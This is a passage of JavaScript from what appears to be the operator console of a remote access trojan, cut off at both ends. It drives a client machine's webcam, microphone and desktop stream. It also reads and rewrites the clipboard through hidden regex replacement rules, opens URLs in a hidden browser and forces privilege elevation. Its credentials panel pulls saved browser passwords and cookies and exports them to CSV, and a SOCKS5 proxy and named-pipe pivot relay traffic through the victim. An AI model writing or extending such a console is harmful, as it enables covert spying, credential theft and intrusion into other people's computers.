              uid: client.uid,
              command: { type: 'RemoteDesktopH264Stop' }
            }).catch(() => {});
            await invoke('send_command', {
              uid: client.uid,
              command: { type: 'RemoteDesktopStop' }
            }).catch(() => {});
          } catch (e) { /* ignore */ }

          // Update global state
          clientRdState.streaming = false;
          clientRdState.mode = null;
        }

        // Cleanup H.264 decoder
        if (rdH264Decoder) {
          try { rdH264Decoder.close(); } catch (e) { /* ignore */ }
          rdH264Decoder = null;
        }

        // Cleanup listeners
        if (rdUnlisten) {
          try {
            const listeners = await rdUnlisten;
            listeners.forEach(fn => fn());
          } catch (e) { /* ignore */ }
        }
      };

      // Initialize UI state based on global state (in case popup was reopened)
      if (clientRdState.streaming) {
        // Stream was active - update UI to reflect that
        setRdStreaming(true, clientRdState.mode);
        rdPlaceholder.textContent = 'Reconnecting to stream...';
        rdStatus.textContent = 'Stream active';
      } else {
        // Ensure UI is in stopped state
        setRdStreaming(false);
      }
      break;

    case 'webcam':
      let webcamStreaming = false;
      let webcamUnlisten = null;

      const videoDeviceSelect = document.getElementById('webcam-video-device');
      const videoOptionsContainer = document.getElementById('webcam-video-options');
      const videoWrapper = document.getElementById('webcam-video-wrapper');
      const audioDeviceSelect = document.getElementById('webcam-audio-device');
      const audioOptionsContainer = document.getElementById('webcam-audio-options');
      const audioWrapper = document.getElementById('webcam-audio-wrapper');
      const startBtn = document.getElementById('webcam-start');
      const stopBtn = document.getElementById('webcam-stop');
      const fullscreenBtn = document.getElementById('webcam-fullscreen');
      const webcamView = document.getElementById('webcam-view');
      const webcamStatus = document.getElementById('webcam-status');

      // Initialize custom dropdown behavior
      const initDropdown = (wrapper, selectBtn, optionsContainer) => {
        selectBtn.addEventListener('click', (e) => {
          e.stopPropagation();
          document.querySelectorAll('.select-wrapper').forEach(w => {
            if (w !== wrapper) w.classList.remove('open');
          });
          wrapper.classList.toggle('open');
        });
        optionsContainer.addEventListener('click', (e) => {
          const option = e.target.closest('.custom-option');
          if (!option) return;
          e.stopPropagation();
          const value = option.dataset.value;
          optionsContainer.querySelectorAll('.custom-option').forEach(opt => opt.classList.remove('selected'));
          option.classList.add('selected');
          selectBtn.textContent = option.textContent;
          selectBtn.dataset.value = value;
          wrapper.classList.remove('open');
        });
      };

      initDropdown(videoWrapper, videoDeviceSelect, videoOptionsContainer);
      initDropdown(audioWrapper, audioDeviceSelect, audioOptionsContainer);

      // Close dropdowns when clicking outside
      document.addEventListener('click', (e) => {
        if (!e.target.closest('.select-wrapper')) {
          [videoWrapper, audioWrapper].forEach(w => w.classList.remove('open'));
        }
      });

      // Fetch available devices
      const fetchDevices = async () => {
        webcamStatus.textContent = 'Loading devices...';
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'ListMediaDevices' }
          });
        } catch (e) {
          webcamStatus.textContent = 'Failed to fetch devices: ' + e;
        }
      };

      // Setup listener for media responses
      const setupWebcamListener = async () => {
        const { listen } = window.__TAURI__.event;
        return listen('shell-response', (event) => {
          if (event.payload.uid !== client.uid) return;
          const response = event.payload.response;

          // Handle device list response
          if (response?.data?.type === 'MediaDevices') {
            const result = response.data.result;

            // Populate video devices
            videoOptionsContainer.innerHTML = '';
            if (result.video_devices && result.video_devices.length > 0) {
              result.video_devices.forEach((dev, idx) => {
                const opt = document.createElement('div');
                opt.className = 'custom-option' + (idx === 0 ? ' selected' : '');
                opt.dataset.value = dev.id;
                opt.textContent = dev.name;
                videoOptionsContainer.appendChild(opt);
              });
              videoDeviceSelect.textContent = result.video_devices[0].name;
              videoDeviceSelect.dataset.value = result.video_devices[0].id;
            } else {
              const opt = document.createElement('div');
              opt.className = 'custom-option selected';
              opt.dataset.value = '';
              opt.textContent = 'No cameras';
              videoOptionsContainer.appendChild(opt);
              videoDeviceSelect.textContent = 'No cameras';
              videoDeviceSelect.dataset.value = '';
            }

            // Populate audio devices
            audioOptionsContainer.innerHTML = '<div class="custom-option selected" data-value="">None</div>';
            if (result.audio_devices && result.audio_devices.length > 0) {
              result.audio_devices.forEach(dev => {
                const opt = document.createElement('div');
                opt.className = 'custom-option';
                opt.dataset.value = dev.id;
                opt.textContent = dev.name;
                audioOptionsContainer.appendChild(opt);
              });
            }

            webcamStatus.textContent = 'Ready';
          }

          // Handle stream started
          else if (response?.data?.type === 'MediaStreamStarted') {
            webcamStreaming = true;
            startBtn.style.opacity = '0.4';
            startBtn.style.pointerEvents = 'none';
            stopBtn.style.opacity = '1';
            stopBtn.style.pointerEvents = 'auto';
            webcamStatus.textContent = 'Streaming...';
          }

          // Handle stream stopped
          else if (response?.data?.type === 'MediaStreamStopped') {
            webcamStreaming = false;
            startBtn.style.opacity = '1';
            startBtn.style.pointerEvents = 'auto';
            stopBtn.style.opacity = '0.4';
            stopBtn.style.pointerEvents = 'none';
            webcamStatus.textContent = 'Stream stopped';
            webcamView.innerHTML = '<span style="color:#888;">No stream</span>';
          }

          // Handle errors
          else if (response?.data?.type === 'Error') {
            webcamStatus.textContent = 'Error: ' + (response.data.result?.message || 'Unknown error');
          }
        });
      };

      // Setup listener for media frames
      const setupFrameListener = async () => {
        const { listen } = window.__TAURI__.event;
        return listen('media-frame', (event) => {
          if (event.payload.uid !== client.uid) return;

          // Server sends: jpegData (raw bytes as array), width, height, timestampMs
          const jpegData = event.payload.jpegData;
          const width = event.payload.width;
          const height = event.payload.height;

          if (jpegData && jpegData.length > 0) {
            // Mark as streaming and enable stop button on first frame
            if (!webcamStreaming) {
              webcamStreaming = true;
              startBtn.style.opacity = '0.4';
              startBtn.style.pointerEvents = 'none';
              stopBtn.style.opacity = '1';
              stopBtn.style.pointerEvents = 'auto';
            }

            // Convert number array directly to Uint8Array (no base64 decode needed!)
            const bytes = new Uint8Array(jpegData);
            const blob = new Blob([bytes], { type: 'image/jpeg' });
            const url = URL.createObjectURL(blob);

            // Update or create img element
            let img = webcamView.querySelector('img');
            if (!img) {
              webcamView.innerHTML = '';
              img = document.createElement('img');
              img.style.cssText = 'max-width:100%;max-height:100%;object-fit:contain;';
              webcamView.appendChild(img);
            }

            // Revoke old URL and set new one
            if (img.src && img.src.startsWith('blob:')) {
              URL.revokeObjectURL(img.src);
            }
            img.src = url;

            webcamStatus.textContent = `Streaming ${width}x${height}`;
          }
        });
      };

      // Initialize listeners
      webcamUnlisten = Promise.all([setupWebcamListener(), setupFrameListener()]);

      // Fetch devices on open
      fetchDevices();

      // Fullscreen button
      fullscreenBtn.addEventListener('click', () => {
        const img = webcamView.querySelector('img');
        if (img && img.src) {
          // Create fullscreen overlay
          const overlay = document.createElement('div');
          overlay.id = 'webcam-fullscreen-overlay';
          overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.95);z-index:99999;display:flex;align-items:center;justify-content:center;cursor:pointer;';

          const fullImg = document.createElement('img');
          fullImg.src = img.src;
          fullImg.style.cssText = 'max-width:95vw;max-height:95vh;object-fit:contain;';
          overlay.appendChild(fullImg);

          const closeHint = document.createElement('div');
          closeHint.style.cssText = 'position:absolute;top:20px;right:20px;color:#888;font-size:12px;';
          closeHint.textContent = 'Click or press ESC to close';
          overlay.appendChild(closeHint);

          // Update image on frames
          const updateFullscreen = setInterval(() => {
            const currentImg = webcamView.querySelector('img');
            if (currentImg && currentImg.src) {
              fullImg.src = currentImg.src;
            }
          }, 50);

          // Close on click or ESC
          const closeOverlay = () => {
            clearInterval(updateFullscreen);
            overlay.remove();
            document.removeEventListener('keydown', escHandler);
          };
          const escHandler = (e) => { if (e.key === 'Escape') closeOverlay(); };
          overlay.addEventListener('click', closeOverlay);
          document.addEventListener('keydown', escHandler);

          document.body.appendChild(overlay);
        }
      });

      // Start stream button
      startBtn.addEventListener('click', async () => {
        const videoDevice = videoDeviceSelect.dataset.value || null;
        const audioDevice = audioDeviceSelect.dataset.value || null;
        const fps = 15; // Hardcoded 15fps
        const quality = 70;
        const resolution = '720p'; // Hardcoded 720p

        webcamStatus.textContent = 'Starting stream...';
        webcamView.innerHTML = '<span style="color:#888;">Connecting...</span>';

        try {
          await invoke('send_command', {
            uid: client.uid,
            command: {
              type: 'StartMediaStream',
              params: {
                video_device: videoDevice,
                audio_device: audioDevice,
                fps: fps,
                quality: quality,
                resolution: resolution
              }
            }
          });
        } catch (e) {
          webcamStatus.textContent = 'Failed to start: ' + e;
        }
      });

      // Stop stream button
      stopBtn.addEventListener('click', async () => {
        webcamStatus.textContent = 'Stopping stream...';
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'StopMediaStream' }
          });
        } catch (e) {
          webcamStatus.textContent = 'Failed to stop: ' + e;
        }
      });

      // Cleanup on popup close - set global callback
      popupCleanupCallback = async () => {
        // Stop stream if running
        if (webcamStreaming) {
          try {
            await invoke('send_command', {
              uid: client.uid,
              command: { type: 'StopMediaStream' }
            });
            webcamStreaming = false;
          } catch (e) { /* ignore */ }
        }

        // Cleanup listeners
        const listeners = await webcamUnlisten;
        listeners.forEach(fn => fn());
      };
      break;

    case 'clipboard':
      let clipboardData = { current: '', history: [], rules: [] };

      // Tab switching
      document.querySelectorAll('.cb-tab').forEach(tab => {
        tab.addEventListener('click', () => {
          document.querySelectorAll('.cb-tab').forEach(t => t.classList.remove('active'));
          document.querySelectorAll('.cb-panel').forEach(p => p.style.display = 'none');
          tab.classList.add('active');
          document.getElementById(`cb-${tab.dataset.tab}`).style.display = 'block';
        });
      });

      // Render functions
      const renderClipboard = () => {
        const content = document.querySelector('.cb-current-content');
        if (clipboardData.current) {
          content.textContent = clipboardData.current;
        } else {
          content.innerHTML = '<span style="color:#888;">(empty)</span>';
        }
      };

      const renderHistory = () => {
        const list = document.querySelector('.cb-history-list');
        if (clipboardData.history.length === 0) {
          list.innerHTML = '<div style="padding:12px;color:#888;text-align:center;">No history</div>';
          return;
        }
        list.innerHTML = clipboardData.history.map((entry, i) => {
          const date = new Date(entry.timestamp * 1000);
          const timeStr = date.toLocaleTimeString();
          const preview = entry.content.length > 100 ? entry.content.substring(0, 100) + '...' : entry.content;
          const replacedInfo = entry.replaced_with
            ? `<div style="font-size:10px;color:#3498db;margin-top:4px;">Replaced with: ${entry.replaced_with.length > 50 ? entry.replaced_with.substring(0, 50).replace(/</g, '&lt;') + '...' : entry.replaced_with.replace(/</g, '&lt;')}</div>`
            : '';
          return `<div class="cb-history-item" data-index="${i}" style="padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05);cursor:pointer;">
            <div style="font-size:10px;color:#666;margin-bottom:4px;">${timeStr}</div>
            <div style="font-size:12px;color:#bbb;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${preview.replace(/</g, '&lt;')}</div>
            ${replacedInfo}
          </div>`;
        }).join('');

        // Click to copy to current
        list.querySelectorAll('.cb-history-item').forEach(item => {
          item.addEventListener('click', async () => {
            const idx = parseInt(item.dataset.index);
            const text = clipboardData.history[idx].content;
            await invoke('send_command', { uid: client.uid, command: { type: 'SetClipboard', params: { data: text } } });
            fetchClipboard();
          });
        });
      };

      const renderRules = () => {
        const list = document.querySelector('.cb-rules-list');
        if (clipboardData.rules.length === 0) {
          list.innerHTML = '<div style="padding:12px;color:#888;text-align:center;">No rules</div>';
          return;
        }
        list.innerHTML = clipboardData.rules.map(rule => {
          const enabledClass = rule.enabled ? '' : 'opacity:0.5;';
          return `<div class="cb-rule-item" data-id="${rule.id}" style="padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05);display:flex;align-items:center;gap:8px;${enabledClass}">
            <label class="toggle small" style="flex-shrink:0;"><input type="checkbox" class="rule-toggle" ${rule.enabled ? 'checked' : ''}><div class="switch"></div></label>
            <div style="flex:1;overflow:hidden;">
              <div style="font-size:11px;color:#888;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${rule.pattern.replace(/</g, '&lt;')}</div>
              <div style="font-size:11px;color:#64b4ff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${rule.replacement.replace(/</g, '&lt;') || '(empty)'}</div>
            </div>
            <button class="rule-delete" style="background:none;border:none;color:#f87171;cursor:pointer;font-size:14px;">&#x2715;</button>
          </div>`;
        }).join('');

        // Toggle rule
        list.querySelectorAll('.rule-toggle').forEach(toggle => {
          toggle.addEventListener('change', async (e) => {
            const ruleId = e.target.closest('.cb-rule-item').dataset.id;
            await invoke('send_command', { uid: client.uid, command: { type: 'UpdateClipboardRule', params: { id: ruleId, enabled: e.target.checked } } });
            fetchRules();
          });
        });

        // Delete rule
        list.querySelectorAll('.rule-delete').forEach(btn => {
          btn.addEventListener('click', async (e) => {
            const ruleId = e.target.closest('.cb-rule-item').dataset.id;
            await invoke('send_command', { uid: client.uid, command: { type: 'RemoveClipboardRule', params: { id: ruleId } } });
            fetchRules();
          });
        });
      };

      // Fetch functions
      const fetchClipboard = async () => {
        document.querySelector('.cb-current-content').innerHTML = '<span style="color:#888;">Loading...</span>';
        await invoke('send_command', { uid: client.uid, command: { type: 'GetClipboard' } });
      };

      const fetchRules = async () => {
        await invoke('send_command', { uid: client.uid, command: { type: 'ListClipboardRules' } });
      };

      // Listen for responses
      const setupClipboardListener = async () => {
        const { listen } = window.__TAURI__.event;
        return listen('shell-response', (event) => {
          if (event.payload.uid !== client.uid) return;
          const response = event.payload.response;
          if (response?.data?.type === 'Clipboard') {
            clipboardData.current = response.data.result.current || '';
            clipboardData.history = response.data.result.history || [];
            renderClipboard();
            renderHistory();
          } else if (response?.data?.type === 'ClipboardRules') {
            clipboardData.rules = response.data.result.rules || [];
            renderRules();
          }
        });
      };

      let clipboardUnlisten = setupClipboardListener();

      // Initial fetch
      fetchClipboard();
      fetchRules();

      // Auto-refresh interval (every 2 seconds when checkbox is checked)
      let cbAutoRefreshInterval = null;
      const startAutoRefresh = () => {
        if (cbAutoRefreshInterval) return;
        cbAutoRefreshInterval = setInterval(() => {
          if (document.getElementById('cb-auto-refresh')?.checked) {
            fetchClipboard();
          }
        }, 2000);
      };
      const stopAutoRefresh = () => {
        if (cbAutoRefreshInterval) {
          clearInterval(cbAutoRefreshInterval);
          cbAutoRefreshInterval = null;
        }
      };
      // Start auto-refresh by default (checkbox is checked by default)
      startAutoRefresh();

      // Refresh button
      document.getElementById('refresh-clipboard')?.addEventListener('click', fetchClipboard);

      // Set clipboard button
      document.getElementById('set-clipboard')?.addEventListener('click', async () => {
        const text = prompt('Enter text to set on client clipboard:');
        if (text !== null) {
          await invoke('send_command', { uid: client.uid, command: { type: 'SetClipboard', params: { data: text } } });
          setTimeout(fetchClipboard, 300);
        }
      });

      // Clear history button
      document.getElementById('clear-history')?.addEventListener('click', async () => {
        await invoke('send_command', { uid: client.uid, command: { type: 'ClearClipboardHistory' } });
        clipboardData.history = [];
        renderHistory();
      });

      // Add rule button
      document.getElementById('add-rule')?.addEventListener('click', async () => {
        const pattern = document.getElementById('rule-pattern').value.trim();
        const replacement = document.getElementById('rule-replacement').value;
        if (!pattern) {
          alert('Please enter a regex pattern');
          return;
        }
        const ruleId = 'rule_' + Date.now();
        await invoke('send_command', { uid: client.uid, command: { type: 'AddClipboardRule', params: { id: ruleId, pattern, replacement, enabled: true } } });
        document.getElementById('rule-pattern').value = '';
        document.getElementById('rule-replacement').value = '';
        setTimeout(fetchRules, 300);
      });

      // Cleanup on close
      popupOverlay.addEventListener('click', async (e) => {
        if (e.target === popupOverlay) {
          stopAutoRefresh();
          const fn = await clipboardUnlisten;
          fn();
        }
      }, { once: true });
      break;

    case 'messagebox':
      document.getElementById('send-msgbox')?.addEventListener('click', async () => {
        const title = document.getElementById('msg-title').value || 'Message';
        const text = document.getElementById('msg-text').value || '';
        const iconRadio = document.querySelector('input[name="msg-icon"]:checked');
        const icon = iconRadio ? iconRadio.value : 'info';
        if (!text) {
          alert('Please enter a message');
          return;
        }
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'MessageBox', params: { title, message: text, icon } }
          });
          console.log(`Messagebox sent to ${client.uid}`);
        } catch (e) {
          console.error('Failed to send messagebox:', e);
          alert('Failed to send messagebox: ' + e);
        }
        closePopup();
      });
      break;

    case 'open-url':
      document.getElementById('open-url-btn')?.addEventListener('click', async () => {
        const url = document.getElementById('url-input').value;
        const hidden = document.getElementById('hidden-browser').checked;
        if (!url) {
          alert('Please enter a URL');
          return;
        }
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'OpenUrl', params: { url, hidden } }
          });
          console.log(`URL opened on ${client.uid}: ${url}`);
        } catch (e) {
          console.error('Failed to open URL:', e);
          alert('Failed to open URL: ' + e);
        }
        closePopup();
      });
      break;


    case 'disconnect':
    case 'uninstall':
    case 'restart-client':
    case 'reconnect':
    case 'reboot':
    case 'shutdown':
    case 'lock':
    case 'logoff':
      document.getElementById('confirm-action')?.addEventListener('click', async () => {
        try {
          let command = null;
          switch (action) {
            case 'shutdown':
              command = { type: 'Shutdown', params: { force: false, delay_secs: 0 } };
              break;
            case 'reboot':
              command = { type: 'Reboot', params: { force: false, delay_secs: 0 } };
              break;
            case 'lock':
              command = { type: 'Lock' };
              break;
            case 'logoff':
              command = { type: 'Logoff', params: { force: false } };
              break;
            case 'uninstall':
              command = { type: 'Uninstall' };
              break;
            case 'disconnect':
              command = { type: 'Disconnect' };
              break;
            case 'reconnect':
              command = { type: 'Reconnect' };
              break;
            case 'restart-client':
              command = { type: 'RestartClient' };
              break;
          }
          if (command) {
            await invoke('send_command', { uid: client.uid, command });
            console.log(`Command '${action}' sent to ${client.uid}`);
          }
        } catch (e) {
          console.error(`Failed to send ${action}:`, e);
          alert(`Failed to send ${action}: ` + e);
        }
        closePopup();
      });
      break;

    case 'elevate':
      document.getElementById('elevate-btn')?.addEventListener('click', async () => {
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'Elevate' }
          });
          console.log(`Elevate command sent to ${client.uid}`);
        } catch (e) {
          console.error('Failed to send elevate command:', e);
          alert('Failed to send elevate command: ' + e);
        }
        closePopup();
      });
      break;

    case 'force-elevate':
      document.getElementById('force-elevate-btn')?.addEventListener('click', async () => {
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'ForceElevate' }
          });
          console.log(`ForceElevate command sent to ${client.uid}`);
        } catch (e) {
          console.error('Failed to send force elevate command:', e);
          alert('Failed to send force elevate command: ' + e);
        }
        closePopup();
      });
      break;

    case 'update':
      document.getElementById('update-btn')?.addEventListener('click', async () => {
        // Update client - would download new client and replace
        const url = document.getElementById('update-url').value;
        console.log(`Updating ${client.uid} from: ${url || 'server default'} - not yet implemented`);
        alert('Update is not yet implemented');
        closePopup();
      });
      break;

    case 'credentials':
      let credentialsData = { passwords: [], cookies: [] };

      // Send command to extract credentials
      (async () => {
        try {
          await invoke('send_command', {
            uid: client.uid,
            command: { type: 'GetCredentials' }
          });
        } catch (e) {
          document.getElementById('creds-loading').style.display = 'none';
          document.getElementById('creds-error').style.display = 'block';
          document.getElementById('creds-error-msg').textContent = e.toString();
        }
      })();

      // Listen for response
      const setupCredsListener = async () => {
        const { listen } = window.__TAURI__.event;
        return listen('shell-response', (event) => {
          if (event.payload.uid !== client.uid) return;
          const response = event.payload.response;

          if (response?.data?.type === 'Credentials') {
            credentialsData.passwords = response.data.result?.passwords || [];
            credentialsData.cookies = response.data.result?.cookies || [];

            document.getElementById('creds-loading').style.display = 'none';
            document.getElementById('creds-results').style.display = 'block';

            renderPasswordsList(credentialsData.passwords);
            renderCookiesList(credentialsData.cookies);

            document.getElementById('creds-password-count').textContent = `${credentialsData.passwords.length} passwords`;
            document.getElementById('creds-cookie-count').textContent = `${credentialsData.cookies.length} cookies`;
          } else if (response?.data?.type === 'Error') {
            document.getElementById('creds-loading').style.display = 'none';
            document.getElementById('creds-error').style.display = 'block';
            document.getElementById('creds-error-msg').textContent = response.data.result?.message || 'Unknown error';
          }
        });
      };

      const renderPasswordsList = (passwords, filter = '') => {
        const list = document.getElementById('creds-passwords-list');
        const filtered = filter
          ? passwords.filter(p =>
              p.url.toLowerCase().includes(filter) ||
              p.username.toLowerCase().includes(filter) ||
              p.browser.toLowerCase().includes(filter))
          : passwords;

        if (filtered.length === 0) {
          list.innerHTML = '<div style="padding:12px;color:#888;text-align:center;">No passwords found</div>';
          return;
        }

        list.innerHTML = filtered.map((p, i) => `
          <div class="cred-item" style="padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05);font-size:11px;">
            <div style="display:flex;justify-content:space-between;margin-bottom:4px;">
              <span style="color:#64b4ff;font-weight:500;">${escapeHtml(p.browser)}</span>
              <span style="color:#888;">${escapeHtml(truncateUrl(p.url))}</span>
            </div>
            <div style="display:flex;gap:8px;">
              <span style="color:#aaa;"><strong>User:</strong> ${escapeHtml(p.username)}</span>
              <span style="color:#aaa;"><strong>Pass:</strong> <span class="cred-password" data-idx="${i}">••••••••</span></span>
              <span class="cred-toggle" data-idx="${i}" style="color:#64b4ff;cursor:pointer;margin-left:auto;">Show</span>
            </div>
          </div>
        `).join('');

        // Add click handlers to toggle password visibility
        list.querySelectorAll('.cred-toggle').forEach(el => {
          el.addEventListener('click', () => {
            const idx = parseInt(el.dataset.idx);
            const passEl = list.querySelector(`.cred-password[data-idx="${idx}"]`);
            if (el.textContent === 'Show') {
              passEl.textContent = credentialsData.passwords[idx].password;
              el.textContent = 'Hide';
            } else {
              passEl.textContent = '••••••••';
              el.textContent = 'Show';
            }
          });
        });
      };

      const renderCookiesList = (cookies, filter = '') => {
        const list = document.getElementById('creds-cookies-list');
        const filtered = filter
          ? cookies.filter(c =>
              c.host.toLowerCase().includes(filter) ||
              c.name.toLowerCase().includes(filter) ||
              c.browser.toLowerCase().includes(filter))
          : cookies;

        if (filtered.length === 0) {
          list.innerHTML = '<div style="padding:12px;color:#888;text-align:center;">No cookies found</div>';
          return;
        }

        list.innerHTML = filtered.slice(0, 500).map(c => `
          <div class="cred-item" style="padding:8px 12px;border-bottom:1px solid rgba(255,255,255,.05);font-size:11px;">
            <div style="display:flex;justify-content:space-between;margin-bottom:2px;">
              <span style="color:#64b4ff;">${escapeHtml(c.browser)}</span>
              <span style="color:#888;">${escapeHtml(c.host)}</span>
            </div>
            <div style="color:#aaa;"><strong>${escapeHtml(c.name)}:</strong> <span style="color:#d0d0d0;word-break:break-all;">${escapeHtml(c.value.substring(0, 100))}${c.value.length > 100 ? '...' : ''}</span></div>
          </div>
        `).join('');

        if (filtered.length > 500) {
          list.innerHTML += `<div style="padding:8px;color:#888;text-align:center;font-size:11px;">Showing first 500 of ${filtered.length} cookies</div>`;
        }
      };

      const truncateUrl = (url) => {
        try {
          const u = new URL(url);
          return u.hostname;
        } catch {
          return url.substring(0, 40);
        }
      };

      const escapeHtml = (str) => {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
      };

      setupCredsListener();

      // Tab switching
      document.getElementById('creds-tab-passwords')?.addEventListener('click', () => {
        document.getElementById('creds-tab-passwords').classList.add('active');
        document.getElementById('creds-tab-cookies').classList.remove('active');
        document.getElementById('creds-passwords-panel').style.display = 'block';
        document.getElementById('creds-cookies-panel').style.display = 'none';
      });

      document.getElementById('creds-tab-cookies')?.addEventListener('click', () => {
        document.getElementById('creds-tab-cookies').classList.add('active');
        document.getElementById('creds-tab-passwords').classList.remove('active');
        document.getElementById('creds-cookies-panel').style.display = 'block';
        document.getElementById('creds-passwords-panel').style.display = 'none';
      });

      // Search handlers
      document.getElementById('creds-password-search')?.addEventListener('input', (e) => {
        renderPasswordsList(credentialsData.passwords, e.target.value.toLowerCase());
      });

      document.getElementById('creds-cookie-search')?.addEventListener('input', (e) => {
        renderCookiesList(credentialsData.cookies, e.target.value.toLowerCase());
      });

      // Export handlers
      const exportPasswords = document.getElementById('creds-export-passwords');
      const exportCookies = document.getElementById('creds-export-cookies');

      // Hover effects
      [exportPasswords, exportCookies].forEach(el => {
        el?.addEventListener('mouseenter', () => el.style.color = '#d0d0d0');
        el?.addEventListener('mouseleave', () => el.style.color = '#888');
      });

      exportPasswords?.addEventListener('click', async () => {
        const csv = 'Browser,URL,Username,Password\n' + credentialsData.passwords.map(p =>
          `"${p.browser}","${p.url}","${p.username}","${p.password}"`
        ).join('\n');
        await downloadCSV(csv, 'passwords.csv');
      });

      exportCookies?.addEventListener('click', async () => {
        const csv = 'Browser,Host,Name,Value,Path,Expires,Secure,HttpOnly\n' + credentialsData.cookies.map(c =>
          `"${c.browser}","${c.host}","${c.name}","${c.value}","${c.path}","${c.expires}","${c.secure}","${c.http_only}"`
        ).join('\n');
        await downloadCSV(csv, 'cookies.csv');
      });

      const downloadCSV = async (content, filename) => {
        try {
          // Convert string to byte array
          const encoder = new TextEncoder();
          const data = Array.from(encoder.encode(content));
          await invoke('save_file_with_dialog', { filename, data });
        } catch (e) {
          console.error('Failed to save CSV:', e);
        }
      };
      break;

    case 'reverse-proxy':
      // Tab switching for proxy types
      const proxyTabs = document.querySelectorAll('[data-proxy-tab]');
      const proxyPanels = document.querySelectorAll('.proxy-panel');

      proxyTabs.forEach(tab => {
        tab.addEventListener('click', () => {
          proxyTabs.forEach(t => t.classList.remove('active'));
          tab.classList.add('active');
          const targetPanel = tab.dataset.proxyTab;
          proxyPanels.forEach(p => {
            p.style.display = p.id === `proxy-${targetPanel}` ? 'block' : 'none';
          });
        });
      });

      // SOCKS5 Panel
      const proxyStatusText = document.getElementById('proxy-status-text');
      const proxyAddress = document.getElementById('proxy-address');
      const proxyCopyHint = document.getElementById('proxy-copy-hint');
      const proxyStartBtn = document.getElementById('proxy-start');
      const proxyStopBtn = document.getElementById('proxy-stop');

      const checkProxyStatus = async () => {
        try {
          const status = await invoke('get_proxy_status', { uid: client.uid });
          updateProxyUI(status);
        } catch (e) {
          console.error('Failed to get proxy status:', e);
        }
      };

      const updateProxyUI = (status) => {
        if (status.running) {
          proxyStatusText.textContent = 'Running:';
          proxyStatusText.style.color = '#22c55e';
          proxyAddress.textContent = ` ${status.address}:${status.port}`;
          proxyAddress.style.display = 'inline';
          proxyCopyHint.style.display = 'inline';
          proxyStartBtn.style.opacity = '0.4';
          proxyStartBtn.style.pointerEvents = 'none';
          proxyStopBtn.style.opacity = '1';
          proxyStopBtn.style.pointerEvents = 'auto';
        } else {
          proxyStatusText.textContent = 'Proxy not running';
          proxyStatusText.style.color = '#888';
          proxyAddress.style.display = 'none';
          proxyCopyHint.style.display = 'none';
          proxyStartBtn.style.opacity = '1';
          proxyStartBtn.style.pointerEvents = 'auto';
          proxyStopBtn.style.opacity = '0.4';
          proxyStopBtn.style.pointerEvents = 'none';
        }
      };

      proxyAddress?.addEventListener('click', () => {
        const addr = proxyAddress.textContent.trim();
        navigator.clipboard.writeText(addr);
        const original = proxyAddress.textContent;
        proxyAddress.textContent = ' Copied!';
        setTimeout(() => { proxyAddress.textContent = original; }, 1000);
      });

      proxyStartBtn?.addEventListener('click', async () => {
        const port = Math.floor(Math.random() * 50000) + 10000;
        proxyStatusText.textContent = 'Starting...';
        proxyStatusText.style.color = '#888';

        try {
          const result = await invoke('start_proxy', { uid: client.uid, port });
          updateProxyUI(result);
        } catch (e) {
          console.error('Failed to start proxy:', e);
          proxyStatusText.textContent = 'Failed: ' + e;
          proxyStatusText.style.color = '#ef4444';
        }
      });

      proxyStopBtn?.addEventListener('click', async () => {
        proxyStatusText.textContent = 'Stopping...';
        proxyStatusText.style.color = '#888';

        try {
          await invoke('stop_proxy', { uid: client.uid });
          updateProxyUI({ running: false });
        } catch (e) {
          console.error('Failed to stop proxy:', e);
        }
      });

      // Local Pipe Panel
      const localPipeNameInput = document.getElementById('proxy-local-pipe-name');
      const localPipeConnectBtn = document.getElementById('proxy-local-pipe-connect');
      const localPipeStatus = document.getElementById('proxy-local-pipe-status');

      localPipeConnectBtn?.addEventListener('click', async () => {
        const pipeName = localPipeNameInput?.value?.trim();
        if (!pipeName) {
          localPipeStatus.textContent = 'Please enter a pipe name';
          localPipeStatus.style.color = '#ef4444';
          return;
        }

        localPipeStatus.textContent = 'Connecting...';
        localPipeStatus.style.color = '#888';

        try {
          await invoke('send_command', {
            uid: client.uid,
            command: {
              type: 'ProxyConnectTarget',
              params: {
                conn_id: Math.floor(Math.random() * 0xFFFFFFFF),
                target: { type: 'LocalPipe', pipe_name: pipeName }
              }
            }
          });
          localPipeStatus.textContent = 'Connection request sent. Check logs for status.';
          localPipeStatus.style.color = '#22c55e';
        } catch (e) {
          console.error('Failed to connect to local pipe:', e);
          localPipeStatus.textContent = 'Failed: ' + e;
          localPipeStatus.style.color = '#ef4444';
        }
      });

      // Remote Pipe Panel
      const remoteServerInput = document.getElementById('proxy-remote-server');
      const remotePipeNameInput = document.getElementById('proxy-remote-pipe-name');
      const remoteUseCredsCheckbox = document.getElementById('proxy-remote-use-creds');
      const remoteCredsSection = document.getElementById('proxy-remote-creds-section');
      const remoteDomainInput = document.getElementById('proxy-remote-domain');
      const remoteUserInput = document.getElementById('proxy-remote-user');
      const remotePassInput = document.getElementById('proxy-remote-pass');
      const remotePipeConnectBtn = document.getElementById('proxy-remote-pipe-connect');
      const remotePipeStatus = document.getElementById('proxy-remote-pipe-status');

      remoteUseCredsCheckbox?.addEventListener('change', () => {
        remoteCredsSection.style.display = remoteUseCredsCheckbox.checked ? 'block' : 'none';
      });

      remotePipeConnectBtn?.addEventListener('click', async () => {
        const server = remoteServerInput?.value?.trim();
        const pipeName = remotePipeNameInput?.value?.trim();

        if (!server || !pipeName) {
          remotePipeStatus.textContent = 'Please enter server and pipe name';
          remotePipeStatus.style.color = '#ef4444';
          return;
        }

        remotePipeStatus.textContent = 'Connecting...';
        remotePipeStatus.style.color = '#888';

        const target = {
          type: 'RemotePipe',
          server: server,
          pipe_name: pipeName,
          username: null,
          password: null,
          domain: null
        };

        if (remoteUseCredsCheckbox?.checked) {
